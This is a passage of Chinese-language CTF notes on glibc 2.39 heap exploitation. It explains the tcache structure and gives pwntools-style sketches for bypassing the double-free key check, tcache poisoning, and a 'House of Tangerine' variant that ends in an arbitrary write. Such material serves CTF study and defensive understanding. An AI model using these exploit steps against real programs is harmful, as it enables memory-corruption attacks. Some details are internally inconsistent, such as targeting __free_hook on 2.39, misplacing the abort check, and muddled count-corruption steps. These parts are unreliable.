- `+0x08` 处的 `key` 始于 2.32 而非 2.39。双重释放检测在 `_int_free`（malloc.c:4527）中比较 `e->key == tcache_key`，并遍历 bin 链表确认后才 abort。`tcache_key` 是一个进程级的 `static uintptr_t`（malloc.c:3127-3128），由 `tcache_key_initialize`（malloc.c:3140-3152）从 getrandom 播种一次 —— 它**不是**每线程独立的，也**不**存放在 `tcache_perthread_struct` 中，因此所有线程共享同一个 key 值。
- `counts[]` 是 `uint16_t counts[TCACHE_MAX_BINS]`（malloc.c:3120）：64 项 × 2 字节 = 128 字节，所以 `entries[]` 从 +0x80 开始，而不是 +0x40。最大计数被限制为 7 —— 释放第 8 个同尺寸 chunk 会进入 fastbin/unsorted 而非 tcache。**在 glibc 2.39（Ubuntu 24.04）上 count = 7 是硬上限。**
- **`calloc` 在 2.39 上绕过 tcache：** `__libc_calloc` 直接调用 `_int_malloc`（malloc.c:3754），从不走只存在于 `__libc_malloc`（malloc.c:3304-3327）中的 tcache 快速路径。`calloc` 从 tcache 取块是 glibc 2.41 的改动：`tcache_try_malloc`（定义于 malloc.c:3349，在 malloc.c:3795 由 `__libc_calloc` 调用）。在 2.39 上，`calloc` 既不从 tcache 弹块，也不执行 key 校验。

```python
# tcache 2.39: key at +0x08 (process-wide), counts uint16_t, entries at +0x80, count 7, calloc bypasses tcache

# Double-free detection (tcache_put):
#   e->key = tcache_key;
#   if (counts[bin] >= 7) goto fastbin;
#   if (e->key == tcache_key) abort("double free or corruption (out)");

# tcache_get (malloc):
#   e = entries[bin];
#   entries[bin] = REVEAL_PTR(e->next);
#   --counts[bin];

# Safe-linked next: next = PROTECT_PTR(chunk_addr, target)
#   PROTECT_PTR(pos, ptr) = ptr ^ (pos >> 12)
```

**双重释放 key 检测绕过的套路：**

```python
from pwn import *

# Scenario: UAF gives double-free on same chunk without intermediate malloc.
# On 2.39, second free aborts if e->key already == tcache_key.

# 1. Allocate and free once (key written, count=1)
p = malloc(0x40)
free(p)  # chunk->key = tcache_key

# 2. Reallocate (malloc pops from tcache, key field becomes user data)
q = malloc(0x40)  # same chunk, now allocated; key field is writable payload area
# Overwrite key field at +0x08 to break detection
payload = p64(0) + p64(0)  # +0x00 next, +0x08 key = 0 (not equal to tcache_key)
edit(q, payload)

# 3. Free again — now e->key != tcache_key, so second free succeeds (no abort)
free(q)  # bypassed!

# 4. calloc is tcache-neutral on 2.39, tcache-aware on 2.41+:
#    On 2.39 calloc never pops tcache, so it cannot clear a stale key and a
#    double-free still aborts on the key check — use calloc as grooming that
#    leaves counts[] and keys untouched:
free(p)  # after bypass, chunk is in tcache again with fresh key
r = calloc(1, 0x40)  # 2.39: fresh chunk via _int_malloc, tcache state unchanged
#    On 2.41+ calloc pops from tcache and zero-fills: if it reuses a chunk you
#    still hold a dangling pointer to, the in-memory key field is cleared to 0,
#    so a stale free passes the e->key != tcache_key fast check.

# 5. Classic tcache poisoning after bypass:
#    Free -> edit fd (mangled) -> malloc -> malloc returns target
free(p)
edit(p, p64((target ^ (p_addr >> 12))))  # mangle fd at +0x00
malloc(0x40)  # pop p
malloc(0x40)  # returns target → arbitrary write
```

**面向 CTF（2024+）的关键要点：**
- 构造伪造 tcache chunk 时始终考虑 `key at +0x08` —— 二次释放前把它清零或设为非 key 值。
- Count 7：同尺寸释放 7 次后，第 8 次释放会漏到 unsorted/fastbin —— 可用于强制走 largebin 路径（见 Largebin 攻击）。
- `calloc` 在 2.39（直到 2.40）绕过 tcache：经由 `calloc` 的分配从不触碰 tcache 状态，因此 calloc 很适合在不扰动 counts/keys 的情况下做堆整形。从 2.41 开始，`calloc` 与 tcache 共用同一条路径（`tcache_try_malloc`），因此通过 `calloc` 也能做 tcache poisoning —— 但必须考虑隐式 `memset(0)` 会清除 next/key 字段。

---

<a id="house-of-tangerine--tcache-count--unsorted-bin-variant"></a>
## House of Tangerine — tcache 计数 + Unsorted Bin 变体

**适用场景：** glibc 2.39（Ubuntu 24.04），此时 tcache 计数为 7，且 `calloc` 绕过 tcache（`__libc_calloc` 直接走 `_int_malloc`）。House of Tangerine 把 tcache 与 unsorted bin 打通，在无法直接溢出到 `fd` 的情况下获得任意写。

**漏洞要求：** 能破坏 `counts[]` 字节或泄漏堆地址的 UAF / off-by-one，外加分配大 chunk 的能力。

**核心思路：**
1. 填满 `0x40` 大小的 tcache bin（计数 7），使下一次 `free(0x40)` 进入 unsorted bin 而不是 tcache。
2. 用 UAF 把另一个尺寸（或同尺寸）的 tcache 计数字节破坏为 `0xff`，让额外的一次 `malloc` 使计数下溢，随后通过 tcache stash 越界写入。
3. 释放一个大的 chunk（>0x400）使其进入 unsorted bin，然后通过分配触发 largebin 排序，把 `main_arena` 写到某个 tcache 的 `next` 指针上。

**最简利用草稿：**

```python
# 1. Fill tcache 0x40 count to 7
chunks = [malloc(0x40) for _ in range(8)]
for c in chunks[:7]:
    free(c)                      # tcache count = 7 (full)
free(chunks[7])                  # 8th free → unsorted bin (not tcache)
# chunks[7] now in unsorted with fd/bk = main_arena+...

# 2. Corrupt tcache count for 0x40 to 0xff via UAF on tcache_perthread_struct
#    tcache_perthread_struct is allocated at heap base via first malloc
#    Overflow from adjacent chunk into counts[bin_index] byte
edit(overflow_chunk, p16(0xffff))  # set count byte to large value

# 3. Drain tcache to trigger stashing unlink (see tcache Stashing Unlink Attack)
#    Now malloc from largebin will stash remaining chunks into tcache,
#    and corrupted count allows writing main_arena pointer to arbitrary target
for _ in range(7):
    malloc(0x40)

# 4. Corrupt unsorted chunk's bk to target-0x10
edit(unsorted_chunk, bk=target-0x10)
malloc(0x40)  # stashes bk → target gets linked into tcache → next malloc returns target
malloc(0x40)
pwn = malloc(0x40)  # == target → arbitrary write (e.g., __free_hook / _IO_list_all)
```

**为什么 2.39 重要：** 在 2.39 上 `calloc` 绕过 tcache，因此 House of Tangerine 的 `count` 破坏可以用不影响计数的 `calloc` 分配来稳定住。在 2.41+ 上，`calloc` 与 tcache 共享路径并会递减同一个 `counts[]` 项，因此攻击者必须考虑到这一点，或者用 `count 7` 饱和来显式强制走 unsorted bin 路径。

**参考：** House of Tangerine — 2024 CTF，针对 glibc 2.39 改编的 House of Muney / tcache stash。

关于 CTF 中特定的 UAF、tcache 和自定义分配器 writeup 变体，继续阅读 [heap-techniques-2.md](heap-techniques-2.md)。
